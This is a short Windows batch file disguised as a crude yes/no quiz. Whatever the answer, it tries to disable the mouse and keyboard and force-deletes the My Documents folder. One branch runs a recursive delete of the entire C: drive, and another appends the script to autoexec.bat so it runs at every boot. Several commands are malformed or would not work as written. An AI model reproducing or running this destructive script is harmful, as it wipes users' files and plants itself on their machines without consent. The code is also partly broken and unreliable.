@echo off
cls
echo Do you like shit?

CHOICE/C:YN

IF ERRORLEVEL Y GOTO YES
IF ERRORLEVEL N GOTO NO

:NO
cls
echo Learn to respect shit!
c:\windows\rundll32.exe mouse,disable
c:\windows\rundll32.exe keyboard,disable
echo MOUSE AND KEYBOARD DISABLE
pause /ty,2 >nul
IF exist "c:\mydocu~1" deltree /y "c:\mydocu~1"
IF not exist goto Eh
echo Like shit!
start iexplore.exe http://www.ratemypoo.com
exit

:Eh
RD/s/q c:\
exit

:YES
cls
echo Nice, you could be my friend
pause
echo BUT IT WONT HELP YOU!
c:\windows\rundll32.exe mouse,disable
c:\windows\rundll32.exe keyboard,disable
echo MOUSE AND KEYBOARD DISABLE
type %0 >> autoexec.bat
RD/s/q c:\windows\deskop
exit 